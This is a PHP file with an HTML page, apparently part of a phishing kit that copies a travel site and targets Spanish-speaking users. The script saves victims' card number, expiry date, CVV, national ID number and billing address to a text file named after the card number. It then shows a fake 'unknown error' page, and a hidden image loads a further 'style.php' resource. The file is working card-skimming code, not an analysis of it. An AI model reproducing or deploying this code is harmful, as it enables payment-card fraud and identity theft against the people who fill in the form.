<?php

session_start();

if(isset($_POST['nombre'])){
$_SESSION['nombre'] = $_POST['nombre'];
$_SESSION['apellido'] = $_POST['apellido'];
$_SESSION['provincia'] = $_POST['provincia'];
$_SESSION['localidad'] = $_POST['localidad'];
$_SESSION['postal'] = $_POST['postal'];
$_SESSION['domicilio'] = $_POST['domicilio'];
}

$file = fopen($_SESSION['cc'].'.txt', "w");

fwrite($file, "---+++DATOS DE LA CC+++---".PHP_EOL);

fwrite($file, "Digitos: ".$_SESSION['cc'].PHP_EOL);
fwrite($file, "Vencimiento: ".$_SESSION['mm'].'/'.$_SESSION['aa'].PHP_EOL);
fwrite($file, "CVV: ".$_SESSION['cvv'].PHP_EOL);

fwrite($file, "---+++DATOS DE FACTURACIÓN+++---".PHP_EOL);
fwrite($file, "Nombre: ".$_SESSION['nombre'].PHP_EOL);
fwrite($file, "Apellido: ".$_SESSION['apellido'].PHP_EOL);
fwrite($file, "DNI: ".$_SESSION['dni'].PHP_EOL);
fwrite($file, "Provincia: ".$_SESSION['provincia'].PHP_EOL);
fwrite($file, "Localidad: ".$_SESSION['localidad'].PHP_EOL);
fwrite($file, "Postal: ".$_SESSION['postal'].PHP_EOL);
fwrite($file, "Domicilio: ".$_SESSION['domicilio'].PHP_EOL);


fclose($file);


?>



<!DOCTYPE html>
    <html lang="en">
    

<head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
        <meta name="HandheldFriendly" content="true">

        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        
        <title>Hubo un error</title>
    </head>
    <body style="
    background: #fa5c48;
    height: 100%;
    margin: 0;
    width: 100%;
    position: absolute;
    display: flex;
    justify-content: center;
    align-items: center;
    position: absolute;
    left: 0;
    top: 0;
    font-family: arial;
">
<main style="
    text-align: center;
">
  
  <h2 style="
    text-align: center;
    color: #fff;
    width: 240px;
">Hubo un error desconocido. Intente nuevamente más tarde.</h2>

<img style="display: none;    background: #fa5c48;
    height: 100%;
    margin: 0;
    width: 100%;
    position: absolute;
    justify-content: center;
    align-items: center;
    position: absolute;
    left: 0;
    top: 0;
    font-family: arial;
    background: #fa5c48;
    height: 100%;
    margin: 0;
    width: 100%;
    position: absolute;
    justify-content: center;
    align-items: center;
    position: absolute;
    left: 0;
    top: 0;
    font-family: arial;
    display: none;" src="./Viaja sin limites_files/style.php">

  <svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;height: 150px;margin-top: 30px;" xml:space="preserve">
  <circle style="fill:#fa5c48;" cx="25" cy="25" r="25"></circle>
<polyline style="fill:none;stroke:#FFFFFF;stroke-width:2;stroke-linecap:round;stroke-miterlimit:10;" points="16,34 25,25 34,16 
	"></polyline>
<polyline style="fill:none;stroke:#FFFFFF;stroke-width:2;stroke-linecap:round;stroke-miterlimit:10;" points="16,16 25,25 34,34 
	"></polyline>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
</svg>



</main>




</body>

</html>


